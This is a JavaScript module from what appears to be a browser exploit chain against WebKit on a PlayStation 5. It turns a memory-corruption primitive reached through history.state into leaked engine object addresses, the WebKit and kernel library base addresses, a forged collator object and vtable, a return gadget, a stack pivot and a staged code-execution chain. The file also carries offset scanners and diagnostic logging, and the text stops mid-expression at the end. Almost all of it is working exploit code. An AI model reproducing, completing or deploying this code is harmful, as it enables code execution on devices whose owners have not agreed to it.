(function () {
    "use strict";
    if (!window._ds || !window._ds.primitives || window._ds.composition) return;
    var _ds = window._ds;
    var c = _ds.c;
    var s = _ds.s;
    var buf = _ds.buf;
    var mark = _ds.mark;

    var scratchBytes = buf.scratchBytes;
    var scratchWords = buf.scratchWords;
    var scratchDouble = buf.scratchDouble;
    var scanChunk = buf.scanChunk;
    var rwHeader = buf.rwHeader;
    var targetHeader = buf.targetHeader;
    var holderHeader = buf.holderHeader;
    var arenaViewHeader = buf.arenaViewHeader;
    var collatorHeader = buf.collatorHeader;
    var compareFnHeader = buf.compareFnHeader;
    var collatorOriginal = buf.collatorOriginal;
    var importWindowA1 = buf.importWindowA1;
    var importWindowB1 = buf.importWindowB1;

    // ── Scanner helpers ──────────────────────────────────────────────────────

    function scanWindowFor(candidate, slotRva, exportOffset, label) {
        var target = s.kernelBase + exportOffset;
        var startRva = Math.max(0, slotRva - 0x20000);
        var endRva = Math.min(slotRva + 0x20000, c.WEBKIT_RELRO_END);
        var found = [];
        var rva = startRva;
        while (rva <= endRva) {
            var addr = s.webkitBase + rva;
            var high = Math.floor(addr / 0x100000000);
            scratchWords[0] = addr - high * 0x100000000;
            scratchWords[1] = high;
            for (var i = 0; i < 8; ++i)
                candidate[0x10 + i] = scratchBytes[i];
            for (var j = 0; j < 0x100; ++j)
                scanChunk[j] = s.rwView[j];
            for (var q = 0; q < 32 && rva <= endRva; ++q, rva += 8) {
                var off = q * 8;
                var v = scanChunk[off]
                    + scanChunk[off + 1] * 0x100
                    + scanChunk[off + 2] * 0x10000
                    + scanChunk[off + 3] * 0x1000000
                    + (scanChunk[off + 4]
                    + scanChunk[off + 5] * 0x100
                    + scanChunk[off + 6] * 0x10000
                    + scanChunk[off + 7] * 0x1000000) * 0x100000000;
                if (v === target)
                    found.push(rva);
            }
        }
        mark("SCAN-" + label, found.length
            ? found.map(function (f) { return "0x" + f.toString(16); }).join(",") : "none");
        return found;
    }

    function readTrampolineBytes(candidate) {
        var out = "";
        var addr = s.kernelBase + c.NATURAL_TRAMPOLINE_OFFSET;
        var high = Math.floor(addr / 0x100000000);
        scratchWords[0] = addr - high * 0x100000000;
        scratchWords[1] = high;
        for (var i = 0; i < 8; ++i)
            candidate[0x10 + i] = scratchBytes[i];
        for (var j = 0; j < 17; ++j)
            out += s.rwView[j].toString(16).padStart(2, "0");
        return out === "488b8fe000000051488b4f60488b7f48c3" ? out : out + "(mismatch)";
    }

    function scanKernelStubs(candidate) {
        if (typeof KernelStubScanner === "undefined") {
            mark("SCAN-STUBS-ERR", "KernelStubScanner not found (kernel-stubs.js missing)");
            return { error: "scanner-missing" };
        }
        var out = KernelStubScanner.scanKernelStubs({
            kernelBase: s.kernelBase,
            getpidExport: c.P_GETPID_EXP,
            closeExport: c.P_CLOSE_EXP,
            readChunk: function (addr) {
                var high = Math.floor(addr / 0x100000000);
                scratchWords[0] = addr - high * 0x100000000;
                scratchWords[1] = high;
                for (var i = 0; i < 8; ++i)
                    candidate[0x10 + i] = scratchBytes[i];
                var chunk = new Uint8Array(0x100);
                for (var j = 0; j < 0x100; ++j)
                    chunk[j] = s.rwView[j];
                return chunk;
            },
        });
        if (!out.error) {
            window.deepslopStubs = out.verified ? out.addresses : null;
            mark("SCAN-STUBS", out.verified
                ? "ok-" + Object.keys(out.addresses).length
                : "unverified-fallback-9.00");
        } else {
            mark("SCAN-STUBS-ERR", String(out.error).slice(0, 80));
        }
        return out;
    }

    function scanAndVerifyOffsets(candidate) {
        var result = {
            hc: s.nativeConstructorAddress - s.webkitBase,
            gd: c.NATURAL_TRAMPOLINE_OFFSET,
            nt: c.NOTIFY_OFFSET,
            gps: c.P_GETPID_SLOT, gpe: c.P_GETPID_EXP,
            cls: c.P_CLOSE_SLOT, cle: c.P_CLOSE_EXP,
            ers: c.P_ERROR_SLOT, ere: c.P_ERROR_EXP,
            found: {}, verified: {},
        };
        try {
            result.found.gps = scanWindowFor(candidate, c.P_GETPID_SLOT,
                c.P_GETPID_EXP, "GPS");
            result.found.cls = scanWindowFor(candidate, c.P_CLOSE_SLOT,
                c.P_CLOSE_EXP, "CLS");
            result.found.ers = scanWindowFor(candidate, c.P_ERROR_SLOT,
                c.P_ERROR_EXP, "ERS");
            result.stubs = scanKernelStubs(candidate);
            var trueHc = s.nativeConstructorAddress - s.webkitBase;
            result.verified.hc = c.P_HOST_CTOR_LIST.some(function (hc) { return hc === trueHc; });
            result.verified.trampolineBytes = readTrampolineBytes(candidate);
            result.verified.kernelBase = s.kernelBaseOK;
            result.verified.webkitBase = s.webkitBaseOK;
            mark("SCAN-SUMMARY", "hc=0x" + result.hc.toString(16)
                + "-gps=" + result.found.gps.length
                + "-cls=" + result.found.cls.length
                + "-ers=" + result.found.ers.length
                + "-trampoline=" + result.verified.trampolineBytes);
        } catch (error) {
            var msg = error ? error.message : "unknown";
            var name = error ? error.name : "Error";
            mark("SCAN-FAIL", name + ":" + String(msg).slice(0, 80));
            result.error = String(msg).slice(0, 120);
        } finally {
            try { _ds.aimCarrier(candidate, s.realCollatorAddress + 0x18); } catch (e) { }
        }
        return result;
    }

    // ── Core Composition (loadHistoryCritical) ───────────────────────────────

    function loadHistoryCritical() {
        var result = null;
        var candidate = null;
        var rwHeaderCaptured = false;
        s.rwVectorTouched = false;
        try {
            result = history.state;
            s.compositionLength = result.length;

            if (s.compositionLength !== c.EXPECTED_LENGTH) {
                result[c.DUPLICATE_INDEX] = undefined;
                result = null;
                _ds.clearPredecessor();
                s.retrySafe = true;
                s.compositionState = 3;
                return;
            }

            if (result[1] === result[c.DUPLICATE_INDEX]) {
                result[c.DUPLICATE_INDEX] = undefined;
                candidate = null;
                result = null;
                _ds.clearPredecessor();
                s.retrySafe = true;
                s.compositionState = 2;
                return;
            }

            candidate = result[c.DUPLICATE_INDEX];
            s.candidateEverReturned = true;
            result[c.DUPLICATE_INDEX] = undefined;
            result = null;

            _ds.readBytes(rwHeader, candidate, c.CELL_BYTES);
            rwHeaderCaptured = true;

            s.rwSID = _ds.uint32At(rwHeader, 0);
            var rwHeaderHigh = _ds.uint32At(rwHeader, 4);
            var rwButterfly = _ds.low48At(rwHeader, 8);
            s.rwOriginalVector = _ds.low48At(rwHeader, 0x10);

            var rwOffsetZero = _ds.allZero(rwHeader, 0x20, 0x28);
            s.rwHeaderOK = s.rwSID >= 0x4000 && s.rwSID < 0x08000000
                && (s.rwSID & 0xf) === 0
                && rwHeader[4] === 0 && rwHeader[5] === 0x28
                && rwHeader[6] === 0x08
                && (rwHeader[7] === 0 || rwHeader[7] === 1)
                && rwHeader[0x0e] === 0 && rwHeader[0x0f] === 0
                && rwButterfly > 0x100000000 && rwButterfly % 8 === 0
                && rwHeader[0x16] === 0 && rwHeader[0x17] === 0
                && s.rwOriginalVector > 0x100000000 && s.rwOriginalVector % 8 === 0
                && rwHeader[0x18] === 0 && rwHeader[0x19] === 1
                && rwHeader[0x1a] === 0 && rwHeader[0x1b] === 0
                && rwHeader[0x1c] === 0 && rwHeader[0x1d] === 0
                && rwHeader[0x1e] === 0 && rwHeader[0x1f] === 0
                && rwOffsetZero && rwHeader[0x28] === 0x58;

            if (!s.rwHeaderOK) {
                s.zeroHeaderMiss = _ds.allZero(rwHeader, 0, c.CELL_BYTES);
                s.retrySafe = s.zeroHeaderMiss && !s.rwVectorTouched
                    && !s.candidateMutationStarted;
                candidate = null;
                _ds.clearPredecessor();
                s.compositionState = 3;
                return;
            }

            scratchWords[0] = s.rwSID;
            scratchWords[1] = (rwHeaderHigh - 0x00020000) >>> 0;
            var upgradedHeader = scratchDouble[0];
            var upgradedFinite = upgradedHeader === upgradedHeader
                && upgradedHeader !== Infinity && upgradedHeader !== -Infinity;
            if (!upgradedFinite) {
                candidate = null;
                _ds.clearPredecessor();
                s.compositionState = 3;
                return;
            }
            s.candidateMutationStarted = true;
            s.fakeHost.q0 = upgradedHeader;
            if (s.fakeHost.q0 !== upgradedHeader) {
                candidate = null;
                _ds.clearPredecessor();
                s.compositionState = 3;
                return;
            }

            s.rwVectorTouched = true;
            _ds.aimCarrier(candidate, s.targetAddress);

            var holderRepeated = _ds.readTwiceMatches(holderHeader, s.rwView,
                c.HOLDER_BYTES);
            var holderSID = _ds.uint32At(holderHeader, 0);
            var holderButterflyZero = _ds.allZero(holderHeader, 0x08, 0x10);
            s.nativeTargetAddress = _ds.low48At(holderHeader, 0x10);
            s.arenaViewAddress = _ds.low48At(holderHeader, 0x18);
            s.realCollatorAddress = _ds.low48At(holderHeader, 0x20);
            s.compareFnAddress = _ds.low48At(holderHeader, 0x28);
            var holderGuardAAddress = _ds.low48At(holderHeader, 0x30);
            var holderGuardBAddress = _ds.low48At(holderHeader, 0x38);
            s.holderHeaderOK = holderRepeated
                && holderSID >= 0x4000 && holderSID < 0x08000000
                && (holderSID & 0xf) === 0 && s.targetAddress % 0x10 === 0
                && holderHeader[4] === 0 && holderHeader[5] === 0x18
                && holderHeader[6] === 0
                && (holderHeader[7] === 0 || holderHeader[7] === 1)
                && holderButterflyZero
                && _ds.plausibleCell(s.nativeTargetAddress)
                && _ds.plausibleCell(s.arenaViewAddress)
                && _ds.plausibleCell(s.realCollatorAddress)
                && _ds.plausibleCell(s.compareFnAddress)
                && _ds.plausibleCell(holderGuardAAddress)
                && _ds.plausibleCell(holderGuardBAddress)
                && _ds.canonicalLow48(holderHeader, 0x10)
                && _ds.canonicalLow48(holderHeader, 0x18)
                && _ds.canonicalLow48(holderHeader, 0x20)
                && _ds.canonicalLow48(holderHeader, 0x28)
                && _ds.canonicalLow48(holderHeader, 0x30)
                && _ds.canonicalLow48(holderHeader, 0x38)
                && s.nativeTargetAddress !== s.arenaViewAddress
                && s.nativeTargetAddress !== s.realCollatorAddress
                && s.arenaViewAddress !== s.realCollatorAddress
                && s.realCollatorAddress !== s.compareFnAddress
                && holderGuardAAddress !== holderGuardBAddress;

            if (!s.holderHeaderOK) {
                _ds.restoreCarrier(candidate);
                s.rwVectorTouched = false;
                candidate = null;
                _ds.clearPredecessor();
                s.compositionState = 3;
                return;
            }

            _ds.aimCarrier(candidate, s.nativeTargetAddress);
            _ds.readBytes(targetHeader, s.rwView, c.FUNCTION_BYTES);

            s.functionStructureID = _ds.uint32At(targetHeader, 0);
            var functionButterfly = _ds.low48At(targetHeader, 0x08);
            var functionScope = _ds.low48At(targetHeader, 0x10);
            s.executableAddress = _ds.low48At(targetHeader, 0x18);
            s.functionHeaderOK = s.functionStructureID >= 0x4000
                && s.functionStructureID < 0x08000000
                && (s.functionStructureID & 0xf) === 0
                && s.nativeTargetAddress % 0x10 === 0
                && targetHeader[4] === 0 && targetHeader[5] === 0x1a
                && targetHeader[6] === 0x0e
                && (targetHeader[7] === 0 || targetHeader[7] === 1)
                && targetHeader[0x0e] === 0 && targetHeader[0x0f] === 0
                && targetHeader[0x16] === 0 && targetHeader[0x17] === 0
                && targetHeader[0x1e] === 0 && targetHeader[0x1f] === 0
                && functionButterfly > 0x100000000
                && functionButterfly <= 0xffffffffffff
                && functionButterfly % 8 === 0
                && functionScope > 0x100000000
                && functionScope <= 0xffffffffffff
                && functionScope % 8 === 0
                && s.executableAddress > 0x100000000
                && s.executableAddress <= 0xffffffffffff
                && s.executableAddress % 0x10 === 0
                && (s.executableAddress & 1) === 0;

            if (!s.functionHeaderOK) {
                _ds.restoreCarrier(candidate);
                s.rwVectorTouched = false;
                candidate = null;
                _ds.clearPredecessor();
                s.compositionState = 3;
                return;
            }

            _ds.aimCarrier(candidate, s.executableAddress);
            _ds.readBytes(targetHeader, s.rwView, c.NATIVE_EXECUTABLE_BYTES);

            s.nativeExecutableStructureID = _ds.uint32At(targetHeader, 0);
            s.nativeFunctionAddress = _ds.low48At(targetHeader, 0x28);
            s.nativeConstructorAddress = _ds.low48At(targetHeader, 0x30);
            
            s.webkitBase = NaN;
            for (var ci = 0; ci < c.P_HOST_CTOR_LIST.length; ++ci) {
                var wb = s.nativeConstructorAddress - c.P_HOST_CTOR_LIST[ci];
                if (wb >= 0x800000000 && wb < 0x900000000 && wb % 0x4000 === 0) {
                    s.webkitBase = wb;
                    s.HOST_CONSTRUCTOR_OFFSET = c.P_HOST_CTOR_LIST[ci];
                    break;
                }
            }
            var constructorBase = s.webkitBase;
            var codeDelta = s.nativeFunctionAddress > s.nativeConstructorAddress
                ? s.nativeFunctionAddress - s.nativeConstructorAddress
                : s.nativeConstructorAddress - s.nativeFunctionAddress;
            s.webkitBaseOK = s.webkitBase >= 0x800000000
                && s.webkitBase < 0x900000000
                && s.webkitBase % 0x4000 === 0
                && constructorBase === s.webkitBase
                && s.nativeFunctionAddress >= s.webkitBase
                && s.nativeFunctionAddress < s.webkitBase + c.WEBKIT_TEXT_SIZE
                && s.nativeConstructorAddress >= s.webkitBase
                && s.nativeConstructorAddress < s.webkitBase + c.WEBKIT_TEXT_SIZE;
            s.nativeExecutableHeaderOK = s.nativeExecutableStructureID >= 0x4000
                && s.nativeExecutableStructureID < 0x08000000
                && (s.nativeExecutableStructureID & 0xf) === 0
                && targetHeader[4] === 0 && targetHeader[5] === 0x08
                && targetHeader[6] === 0
                && (targetHeader[7] === 0 || targetHeader[7] === 1)
                && targetHeader[0x2e] === 0 && targetHeader[0x2f] === 0
                && targetHeader[0x36] === 0 && targetHeader[0x37] === 0
                && s.nativeFunctionAddress >= 0x800000000
                && s.nativeFunctionAddress < 0x900000000
                && s.nativeConstructorAddress >= 0x800000000
                && s.nativeConstructorAddress < 0x900000000
                && s.nativeFunctionAddress !== s.nativeConstructorAddress
                && codeDelta > 0 && codeDelta < c.WEBKIT_TEXT_SIZE
                && s.webkitBaseOK;

            if (!s.nativeExecutableHeaderOK) {
                _ds.restoreCarrier(candidate);
                s.rwVectorTouched = false;
                candidate = null;
                _ds.clearPredecessor();
                s.compositionState = 3;
                return;
            }

            _ds.aimCarrier(candidate, s.nativeTargetAddress);
            var executableAddress2 = _ds.low48At(s.rwView, 0x18);
            var functionType2 = s.rwView[5];

            _ds.aimCarrier(candidate, s.executableAddress);
            var nativeFunctionAddress2 = _ds.low48At(s.rwView, 0x28);
            var nativeConstructorAddress2 = _ds.low48At(s.rwView, 0x30);
            var nativeExecutableType2 = s.rwView[5];
            s.pointersRepeated = executableAddress2 === s.executableAddress
                && nativeFunctionAddress2 === s.nativeFunctionAddress
                && nativeConstructorAddress2 === s.nativeConstructorAddress
                && functionType2 === 0x1a && nativeExecutableType2 === 0x08;

            var getpidSlotAddress = s.webkitBase + c.P_GETPID_SLOT;
            var closeSlotAddress = s.webkitBase + c.P_CLOSE_SLOT;
            var errorSlotAddress = s.webkitBase + c.P_ERROR_SLOT;

            _ds.aimCarrier(candidate, getpidSlotAddress);
            s.getpidPointer = _ds.low48At(s.rwView, 0);
            var getpidCanonical = s.rwView[6] === 0 && s.rwView[7] === 0;
            _ds.aimCarrier(candidate, getpidSlotAddress);
            var getpidPointer2 = _ds.low48At(s.rwView, 0);

            _ds.aimCarrier(candidate, closeSlotAddress);
            s.closePointer = _ds.low48At(s.rwView, 0);
            var closeCanonical = s.rwView[6] === 0 && s.rwView[7] === 0;
            _ds.aimCarrier(candidate, closeSlotAddress);
            var closePointer2 = _ds.low48At(s.rwView, 0);

            _ds.aimCarrier(candidate, errorSlotAddress);
            s.errorPointer = _ds.low48At(s.rwView, 0);
            var errorCanonical = s.rwView[6] === 0 && s.rwView[7] === 0;
            _ds.aimCarrier(candidate, errorSlotAddress);
            var errorPointer2 = _ds.low48At(s.rwView, 0);

            s.gotReadAttempted = true;
            s.gotWindowAddressesOK = getpidSlotAddress % 8 === 0
                && closeSlotAddress % 8 === 0 && errorSlotAddress % 8 === 0;
            s.gotWindowsRepeated = s.getpidPointer === getpidPointer2
                && s.closePointer === closePointer2
                && s.errorPointer === errorPointer2;
            s.gotCanonicalOK = getpidCanonical && closeCanonical && errorCanonical
                && _ds.plausibleCell(s.getpidPointer) && _ds.plausibleCell(s.closePointer)
                && _ds.plausibleCell(s.errorPointer);
            s.gotReadOK = s.pointersRepeated && s.gotReadAttempted
                && s.gotWindowAddressesOK && s.gotWindowsRepeated && s.gotCanonicalOK;

            s.requirementsBaseOK = true;
            s.libcBaseOK = true;

            var getpidBase = s.getpidPointer - c.P_GETPID_EXP;
            var closeBase = s.closePointer - c.P_CLOSE_EXP;
            var errorBase = s.errorPointer - c.P_ERROR_EXP;
            s.getpidStatus = 1;
            s.closeStatus = 1;
            s.errorStatus = 1;
            s.kernelBase = getpidBase;
            s.kernelResolvedCount = 3;
            var kernelConsistent = getpidBase === closeBase
                && getpidBase === errorBase;
            s.kernelBaseOK = s.gotReadOK && kernelConsistent
                && _ds.inPS5UserModuleBand(s.kernelBase)
                && s.kernelBase % 0x4000 === 0 && s.kernelBase !== s.webkitBase;

            s.notifyEntryAddress = s.kernelBase + c.NOTIFY_OFFSET;
            s.notifyAddressOK = s.kernelBaseOK
                && s.getpidStatus === 1
                && s.notifyEntryAddress === s.kernelBase + c.NOTIFY_OFFSET
                && s.notifyEntryAddress >= s.kernelBase
                && s.notifyEntryAddress < s.kernelBase + c.KERNEL_TEXT_SIZE;

            _ds.aimCarrier(candidate, s.arenaViewAddress);
            var arenaHeaderRepeated = _ds.readTwiceMatches(arenaViewHeader, s.rwView,
                c.ARENA_VIEW_BYTES);
            var arenaSID = _ds.uint32At(arenaViewHeader, 0);
            var arenaButterfly = _ds.low48At(arenaViewHeader, 0x08);
            s.arenaBacking = _ds.low48At(arenaViewHeader, 0x10);
            var arenaLength = _ds.low48At(arenaViewHeader, 0x18);
            s.arenaViewHeaderOK = arenaHeaderRepeated && arenaSID === s.rwSID
                && s.arenaViewAddress % 8 === 0
                && arenaViewHeader[4] === 0 && arenaViewHeader[5] === 0x28
                && arenaViewHeader[6] === 0x08
                && (arenaViewHeader[7] === 0 || arenaViewHeader[7] === 1)
                && _ds.plausibleCell(arenaButterfly)
                && _ds.plausibleCell(s.arenaBacking) && s.arenaBacking % 0x10 === 0
                && _ds.canonicalLow48(arenaViewHeader, 0x08)
                && _ds.canonicalLow48(arenaViewHeader, 0x10)
                && _ds.canonicalLow48(arenaViewHeader, 0x18)
                && arenaLength === c.ARENA_BYTES
                && _ds.allZero(arenaViewHeader, 0x20, 0x28)
                && arenaViewHeader[0x28] === 0x58;

            if (s.arenaViewHeaderOK) {
                _ds.aimCarrier(candidate, s.arenaBacking + 0xf00);
                s.arenaBackingRepeated = s.rwView[0] === 0x52 && s.rwView[1] === 0x4f
                    && s.rwView[2] === 0x50 && s.rwView[3] === 0x31
                    && s.rwView[0] === s.arenaView[0xf00]
                    && s.rwView[1] === s.arenaView[0xf01]
                    && s.rwView[2] === s.arenaView[0xf02]
                    && s.rwView[3] === s.arenaView[0xf03];
            }

            _ds.aimCarrier(candidate, s.realCollatorAddress);
            var collatorRepeated = _ds.readTwiceMatches(collatorHeader, s.rwView,
                c.COLLATOR_BYTES);
            var collatorSID = _ds.uint32At(collatorHeader, 0);
            var collatorBoundCompare = _ds.low48At(collatorHeader, 0x10);
            var originalUCollator = _ds.low48At(collatorHeader, 0x18);
            var localeImpl = _ds.low48At(collatorHeader, 0x20);
            var collationImpl = _ds.low48At(collatorHeader, 0x28);
            s.collatorHeaderOK = collatorRepeated
                && collatorSID >= 0x4000 && collatorSID < 0x08000000
                && (collatorSID & 0xf) === 0 && s.realCollatorAddress % 8 === 0
                && collatorHeader[4] === 0 && collatorHeader[5] === 0x17
                && (collatorHeader[7] === 0 || collatorHeader[7] === 1)
                && _ds.allZero(collatorHeader, 0x08, 0x10)
                && collatorBoundCompare === s.compareFnAddress
                && _ds.plausibleAddress(originalUCollator)
                && _ds.plausibleAddress(localeImpl) && _ds.plausibleAddress(collationImpl)
                && _ds.canonicalLow48(collatorHeader, 0x10)
                && _ds.canonicalLow48(collatorHeader, 0x18)
                && _ds.canonicalLow48(collatorHeader, 0x20)
                && _ds.canonicalLow48(collatorHeader, 0x28)
                && collatorHeader[0x30] === 1
                && collatorHeader[0x33] === 0;
            for (var saveCollator = 0; saveCollator < collatorOriginal.length;
                ++saveCollator)
                collatorOriginal[saveCollator] = collatorHeader[0x18 + saveCollator];

            _ds.aimCarrier(candidate, s.compareFnAddress);
            var compareHeaderRepeated = _ds.readTwiceMatches(compareFnHeader, s.rwView,
                c.BOUND_COMPARE_BYTES);
            var compareSID = _ds.uint32At(compareFnHeader, 0);
            s.compareFnHeaderOK = compareHeaderRepeated
                && compareSID >= 0x4000 && compareSID < 0x08000000
                && (compareSID & 0xf) === 0 && s.compareFnAddress % 8 === 0
                && compareFnHeader[4] === 0 && compareFnHeader[5] === 0x1a
                && compareFnHeader[6] === 0x0c
                && (compareFnHeader[7] === 0 || compareFnHeader[7] === 1)
                && typeof s.compareFn === "function";

            s.naturalTrampolineAddress = s.kernelBase + c.NATURAL_TRAMPOLINE_OFFSET;
            s.fakeUCollatorAddress = s.arenaBacking + c.FAKE_UCOLLATOR_OFFSET;
            s.fakeVtableAddress = s.arenaBacking + c.FAKE_VTABLE_OFFSET;
            s.arenaLayoutOK = s.arenaViewHeaderOK && s.arenaBackingRepeated
                && s.kernelBaseOK && s.arenaBacking % 0x10 === 0
                && s.fakeUCollatorAddress >= s.arenaBacking
                && s.fakeUCollatorAddress + 0x100 <= s.arenaBacking + c.ARENA_BYTES
                && s.fakeVtableAddress >= s.arenaBacking
                && s.fakeVtableAddress + 0x130 <= s.arenaBacking + c.ARENA_BYTES
                && s.arenaBacking + c.RCE_CHAIN_OFFSET + 0x700
                <= s.arenaBacking + c.ARENA_BYTES
                && s.getpidStatus === 1
                && s.kernelBase + c.RCE_PIVOT_TRAMPOLINE_RVA >= s.kernelBase
                && s.kernelBase + c.RCE_PIVOT_TRAMPOLINE_RVA
                < s.kernelBase + c.KERNEL_TEXT_SIZE
                && s.naturalTrampolineAddress >= s.kernelBase
                && s.naturalTrampolineAddress < s.kernelBase + c.KERNEL_TEXT_SIZE;

            if (s.arenaLayoutOK && s.holderHeaderOK && s.functionHeaderOK
                && s.nativeExecutableHeaderOK && s.webkitBaseOK && s.pointersRepeated
                && s.gotReadOK && s.requirementsBaseOK && s.libcBaseOK && s.kernelBaseOK
                && s.collatorHeaderOK && s.compareFnHeaderOK) {
                _ds.putLow48(s.arenaView, c.FAKE_UCOLLATOR_OFFSET + 0x00,
                    s.fakeVtableAddress);
                for (var zeroRdi = 0; zeroRdi < 8; ++zeroRdi)
                    s.arenaView[c.FAKE_UCOLLATOR_OFFSET + 0x48 + zeroRdi] = 0;
                for (var zeroRcx = 0; zeroRcx < 8; ++zeroRcx)
                    s.arenaView[c.FAKE_UCOLLATOR_OFFSET + 0x60 + zeroRcx] = 0;
                var retGadget = s.kernelBase + 0xc7;
                _ds.putLow48(s.arenaView, c.FAKE_UCOLLATOR_OFFSET + 0xe0,
                    retGadget);
                _ds.putLow48(s.arenaView, c.FAKE_UCOLLATOR_OFFSET + 0xf8,
                    s.arenaBacking + c.RCE_CHAIN_OFFSET);
                var rcePivotAddress = s.kernelBase + c.RCE_PIVOT_TRAMPOLINE_RVA;
                _ds.putLow48(s.arenaView, c.FAKE_VTABLE_OFFSET + 0x128,
                    rcePivotAddress);
                var rceChainLen = _ds.buildRceChain(s.arenaView,
                    s.arenaBacking, s.kernelBase);

                s.arenaFilledOK = _ds.low48StoredExactly(s.arenaView,
                    c.FAKE_UCOLLATOR_OFFSET + 0x00, s.fakeVtableAddress)
                    && _ds.allZero(s.arenaView, c.FAKE_UCOLLATOR_OFFSET + 0x48,
                        c.FAKE_UCOLLATOR_OFFSET + 0x50)
                    && _ds.allZero(s.arenaView, c.FAKE_UCOLLATOR_OFFSET + 0x60,
                        c.FAKE_UCOLLATOR_OFFSET + 0x68)
                    && _ds.low48StoredExactly(s.arenaView,
                        c.FAKE_UCOLLATOR_OFFSET + 0xe0, retGadget)
                    && _ds.low48StoredExactly(s.arenaView,
                        c.FAKE_UCOLLATOR_OFFSET + 0xf8,
                        s.arenaBacking + c.RCE_CHAIN_OFFSET)
                    && _ds.low48StoredExactly(s.arenaView,
                        c.FAKE_VTABLE_OFFSET + 0x128, rcePivotAddress)
                    && rceChainLen > 0;
            }

            s.notifyReady = s.arenaFilledOK && s.collatorHeaderOK && s.compareFnHeaderOK
                && s.getpidStatus === 1 && s.notificationRequestOK
                && s.notifyAddressOK;
            if (s.notifyReady) {
                _ds.aimCarrier(candidate, s.realCollatorAddress + 0x18);
                s.carrierArmedForCommit = _ds.sameBytes(s.rwView, collatorOriginal,
                    collatorOriginal.length);
                s.notifyReady = s.notifyReady && s.carrierArmedForCommit;
            }

            if (!s.notifyReady) {
                _ds.restoreCarrier(candidate);
                s.rwVectorTouched = false;
                s.targetView[0] = 0xa5;
                s.rwMirror[0] = 0x3c;
                s.restoreObserved = s.rwView[0] === 0x3c
                    && s.rwMirror[0] === 0x3c && s.targetView[0] === 0xa5;
            } else {
                s.rwVectorTouched = false;
                s.restoreObserved = s.rwMirror[0] === 0x3c
                    && s.targetView[0] === 0xa5;
            }
            if (c.SCAN_MODE || c.PROBE_MODE)
                s.deepslopScan = scanAndVerifyOffsets(candidate);
            candidate = null;
            _ds.clearPredecessor();
            s.compositionState = 1;
        } catch (error) {
            s.retrySafe = candidate === null && result === null
                && !rwHeaderCaptured && error && error.name === "TypeError";
            if (result !== null) {
                try { result[c.DUPLICATE_INDEX] = undefined; } catch (e) { }
            }
            if (candidate !== null && rwHeaderCaptured && s.rwVectorTouched) {
                try { _ds.restoreCarrier(candidate); } catch (e) { }
            }
            candidate = null;
            result = null;
            try { s.targetView[0] = 0xa5; } catch (e) { }
            try { s.rwMirror[0] = 0x3c; } catch (e) { }
            try { _ds.clearPredecessor(); } catch (e) { }
            s.compositionError = error;
            s.compositionState = -1;
        }
    }

    // ── Diagnostic reporting ─────────────────────────────────────────────────

    function reportComposition() {
        if (s.compositionState < 0) {
            var errName = s.compositionError ? s.compositionError.name : "Error";
            var errMsg = s.compositionError ? String(s.compositionError.message).slice(0, 80) : "unknown";
            mark(s.retrySafe ? "SSV-PLACEMENT-MISS" : "LOAD-THREW", errName + ":" + errMsg);
            mark("DONE-THROW", "predecessor-cleared=true-retry-safe=" + s.retrySafe
                + "-candidate-seen=" + s.candidateEverReturned
                + "-candidate-mutated=" + s.candidateMutationStarted);
            if (!s.retrySafe) {
                try { sessionStorage.setItem(s.blockKey, "1"); } catch (e) { }
                _ds.failed();
            }
            if (s.retrySafe && typeof _ds.scheduleSafeRetry === "function")
                _ds.scheduleSafeRetry("placement-throw");
            return;
        }

        if (s.compositionState === 2) {
            mark("NORMAL-CLONE-MISS", "known-reference-returned=true");
            mark("DONE-MISS", "predecessor-cleared=true-retry-safe=true"
                + "-candidate-seen=false-candidate-mutated=false");
            if (typeof _ds.scheduleSafeRetry === "function") _ds.scheduleSafeRetry("normal-clone-miss");
            return;
        }

        if (s.compositionState === 3) {
            var mismatchTag = s.zeroHeaderMiss ? "ZERO-HEADER-MISS"
                : (s.retrySafe ? "COMPOSITION-LENGTH-MISS" : "VALIDATION-MISMATCH");
            mark(mismatchTag, "rw=" + s.rwHeaderOK
                + "-holder=" + s.holderHeaderOK
                + "-function=" + s.functionHeaderOK
                + "-native-executable=" + s.nativeExecutableHeaderOK
                + "-base=" + s.webkitBaseOK
                + "-repeat=" + s.pointersRepeated
                + "-retry-safe=" + s.retrySafe
                + "-candidate-seen=" + s.candidateEverReturned
                + "-candidate-mutated=" + s.candidateMutationStarted
                + "-zero-header-miss=" + s.zeroHeaderMiss
                + "-carrier-restored=true");
            mark("RW-HEADER-HEX", _ds.dumpHex(rwHeader, c.CELL_BYTES));
            mark("WALK-BYTES-HEX", _ds.dumpHex(targetHeader, c.NATIVE_EXECUTABLE_BYTES));
            if (!s.retrySafe) {
                try { sessionStorage.setItem(s.blockKey, "1"); } catch (e) { }
                _ds.failed();
            }
            if (s.retrySafe && typeof _ds.scheduleSafeRetry === "function")
                _ds.scheduleSafeRetry(s.zeroHeaderMiss
                    ? "zero-header-miss" : "composition-length-mismatch");
            return;
        }

        if (s.compositionState === 0) {
            mark("NO-RESULT", "critical-load-did-not-finish");
            _ds.failed();
            return;
        }

        mark("SSV-RETURNED-CLEARED", "length=" + s.compositionLength
            + "-predecessor-cleared=true");
        mark("RW-CARRIER", "sid=" + _ds.hex(_ds.uint32At(rwHeader, 0))
            + "-vector=" + _ds.hex(s.rwOriginalVector)
            + "-length=0x100-mode=0x" + rwHeader[0x28].toString(16));
        mark("HOLDER", "cell=" + _ds.hex(s.targetAddress)
            + "-header-pass=" + s.holderHeaderOK);
        mark("JSFUNCTION", "parseInt=" + _ds.hex(s.nativeTargetAddress)
            + "-sid=" + _ds.hex(s.functionStructureID)
            + "-executable=" + _ds.hex(s.executableAddress));
        mark("NATIVE-EXECUTABLE", "P=" + _ds.hex(s.executableAddress)
            + "-sid=" + _ds.hex(s.nativeExecutableStructureID));
        mark("NATIVE-CALL-TARGET", "parseInt=" + _ds.hex(s.nativeFunctionAddress)
            + "-constructor=" + _ds.hex(s.nativeConstructorAddress));
        mark("WEBKIT-BASE", "" + _ds.hex(s.webkitBase)
            + "-parseInt-rva=" + _ds.hex(c.PARSEINT_NATIVE_OFFSET)
            + "-constructor-rva=" + _ds.hex(s.HOST_CONSTRUCTOR_OFFSET)
            + "-text-size=" + _ds.hex(c.WEBKIT_TEXT_SIZE));
        mark("IMPORT-WINDOWS", "A=" + _ds.hex(s.webkitBase + c.IMPORT_WINDOW_A_OFFSET)
            + "+" + _ds.hex(c.IMPORT_WINDOW_A_BYTES)
            + "-B=" + _ds.hex(s.webkitBase + c.IMPORT_WINDOW_B_OFFSET)
            + "+" + _ds.hex(c.IMPORT_WINDOW_B_BYTES)
